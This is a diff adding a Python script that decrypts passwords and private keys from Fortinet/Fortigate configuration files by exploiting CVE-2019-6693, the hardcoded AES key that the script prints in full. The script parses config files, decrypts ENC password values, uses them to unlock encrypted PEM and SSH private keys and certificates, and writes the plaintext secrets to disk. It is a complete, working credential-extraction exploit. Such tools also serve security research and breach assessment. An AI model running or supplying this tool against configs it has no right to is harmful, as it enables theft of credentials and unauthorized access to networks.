@@ -1,0 +1,166 @@
+#!/usr/bin/python
+# SPDX-License-Identifier: 0BSD
+#
+# Decrypts private keys and passwords from
+# Fortinet/Fortigate devices (CVE-2019-6693)
+#
+# See also:
+# https://blog.hboeck.de/archives/908-Private-Keys-in-the-Fortigate-Leak.html
+
+import argparse
+import base64
+import binascii
+import hashlib
+import os
+import pathlib
+import warnings
+
+from cryptography.hazmat.primitives import ciphers, hashes, serialization
+from cryptography.hazmat.primitives.serialization import (load_pem_private_key,
+                                                          load_ssh_private_key)
+from cryptography.utils import CryptographyDeprecationWarning
+from cryptography.x509 import load_pem_x509_certificate
+
+
+def hashme(istr):
+    ib = istr.encode()
+    return base64.b32encode(hashlib.sha256(ib).digest()).decode().lower()[0:10]
+
+
+# works with private key or cert
+def hashkey(key):
+    pubkey = key.public_key()
+    pubraw = pubkey.public_bytes(serialization.Encoding.DER,
+                                 serialization.PublicFormat.SubjectPublicKeyInfo)
+    return base64.b32encode(hashlib.sha256(pubraw).digest()).decode().lower()[0:10]
+
+
+def decpw(b64enc):
+    try:
+        rawenc = base64.b64decode(b64enc)
+    except binascii.Error:
+        return b"b64err"
+
+    aeskey = b"Mary had a littl"
+    iv = rawenc[0:4] + b"\00" * 12
+    payload = rawenc[4:]
+    ciph = ciphers.Cipher(ciphers.algorithms.AES(aeskey), ciphers.modes.CBC(iv))
+    decryptor = ciph.decryptor()
+    try:
+        res = decryptor.update(payload) + decryptor.finalize()
+    except ValueError:
+        return b"decfail"
+    try:
+        finish = res.index(b"\00")
+    except ValueError:
+        return res
+    return res[0:finish]
+
+
+def parsefile(fn, outdir):
+    pk = ""
+    pwd = b"empty"
+    keymode = False
+    output = None
+    ofn = None
+    confline = ""
+    with open(fn) as f:
+        lineno = pwdlno = keylno = 0
+        for line in f:
+            lineno += 1
+            ls = line.strip()
+            if " ENC " in ls:
+                pwc = ls.split(" ")[-1]
+                pwd = decpw(pwc)
+                strpwd = pwd.decode(encoding="ASCII", errors="replace")
+                pwdlno = lineno
+
+                if args.password:
+                    pwfile.write(f"{strpwd} {fn}:{lineno}\n")
+            elif ls.startswith("config"):
+                confline = ls
+            elif ls.endswith("-----BEGIN ENCRYPTED PRIVATE KEY-----"):
+                pk = "-----BEGIN ENCRYPTED PRIVATE KEY-----\n"
+                keylno = lineno
+                keymode = True
+            elif keymode and ls.startswith("-----END ENCRYPTED PRIVATE KEY-----"):
+                keymode = False
+                pk += "-----END ENCRYPTED PRIVATE KEY-----\n"
+                try:
+                    key = load_pem_private_key(
+                        pk.encode(),
+                        password=pwd,
+                        unsafe_skip_rsa_key_validation=True,
+                    )
+                except ValueError:
+                    ofn = hashme(pk) + ".key-encrypted"
+                    output = pk
+                else:
+                    ofn = f"{hashkey(key)}.key"
+                    output = key.private_bytes(
+                        encoding=serialization.Encoding.PEM,
+                        format=serialization.PrivateFormat.PKCS8,
+                        encryption_algorithm=serialization.NoEncryption(),
+                    ).decode()
+
+            elif ls.endswith("-----BEGIN OPENSSH PRIVATE KEY-----"):
+                pk = "-----BEGIN OPENSSH PRIVATE KEY-----\n"
+                keylno = lineno
+                keymode = True
+            elif keymode and ls.startswith("-----END OPENSSH PRIVATE KEY-----"):
+                keymode = False
+                pk += "-----END OPENSSH PRIVATE KEY-----\n"
+                try:
+                    key = load_ssh_private_key(pk.encode(), password=pwd)
+                except ValueError:
+                    kh = hashme(pk)
+                    ofn = f"{kh}.ssh.key-encrypted"
+                    output = pk
+                else:
+                    ofn = f"{hashkey(key)}.ssh.key"
+                    output = key.private_bytes(
+                        encoding=serialization.Encoding.PEM,
+                        format=serialization.PrivateFormat.PKCS8,
+                        encryption_algorithm=serialization.NoEncryption(),
+                    ).decode()
+
+            elif ls.endswith("-----BEGIN CERTIFICATE-----"):
+                pk = "-----BEGIN CERTIFICATE-----\n"
+                keylno = lineno
+                keymode = True
+            elif keymode and ls.startswith("-----END CERTIFICATE-----"):
+                pk += "-----END CERTIFICATE-----\n"
+                xcrt = load_pem_x509_certificate(pk.encode())
+                ctoken = base64.b32encode(xcrt.fingerprint(hashes.SHA256())).lower().decode()[0:10]
+                ofn = f"{hashkey(xcrt)}-{ctoken}.crt"
+                output = pk
+            elif keymode:
+                pk += ls + "\n"
+
+            if output:
+                c = confline + "\n"
+                c += f"file: {fn}\n"
+                c += f"Line {keylno}\n"
+                c += f"Password line {pwdlno}\n"
+                c += f"Password {strpwd}\n"
+                c += "\n"
+                c += output
+                pathlib.Path(f"{outdir}/{ofn}").write_text(c)
+                output = None
+
+
+warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)
+
+ap = argparse.ArgumentParser()
+ap.add_argument("configfile", nargs="+")
+ap.add_argument("-o", "--outdir", required=True)
+ap.add_argument("-p", "--password", help="Save all found passwords to file")
+args = ap.parse_args()
+
+if args.password:
+    pwfile = open(args.password, "w")
+
+os.makedirs(args.outdir, exist_ok=True)
+
+for fn in args.configfile:
+    parsefile(fn, args.outdir)
